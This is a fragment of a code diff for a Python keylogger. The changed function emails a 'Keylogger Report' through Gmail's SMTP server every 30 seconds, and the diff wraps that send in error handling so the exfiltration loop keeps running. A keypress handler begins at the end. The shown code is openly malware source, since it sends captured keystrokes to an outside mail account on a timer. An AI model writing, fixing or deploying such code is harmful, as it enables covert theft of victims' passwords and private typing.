@@ -21,13 +21,14 @@ def send_email():
     msg['Subject'] = 'Keylogger Report'
     msg['From'] = email
     msg['To'] = email
-
-    with smtplib.SMTP('smtp.gmail.com', 587) as server:
-        server.starttls()
-        server.login(email, app_key)
-        server.send_message(msg)
-
-    Timer(30, send_email).start()  # Send email every 30 seconds
+    try:
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(email, app_key)
+            server.send_message(msg)
+            Timer(30, send_email).start()  # Send email every 30 seconds
+    except Exception as e:
+        print(f"Failed to send email: {e}")
 
 def on_press(key):
     try:
